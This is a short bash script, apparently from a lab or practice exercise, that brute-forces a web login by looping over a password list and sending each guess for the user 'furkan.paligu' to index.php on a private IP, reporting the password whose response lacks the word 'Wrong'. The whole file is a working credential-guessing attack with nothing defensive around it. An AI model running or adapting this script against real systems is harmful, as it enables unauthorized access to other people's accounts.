ip="192.168.3.151"
username="furkan.paligu"
password="not found try better"
while read pass
do
	cor=$(curl -s "${ip}/index.php?username=${username}&password=${pass}" | grep "Wrong")

	if [[ -z "${cor}" ]]
	then
		password="${pass}"
	fi
done < "passwords.txt"

echo "password is ( ${password} )"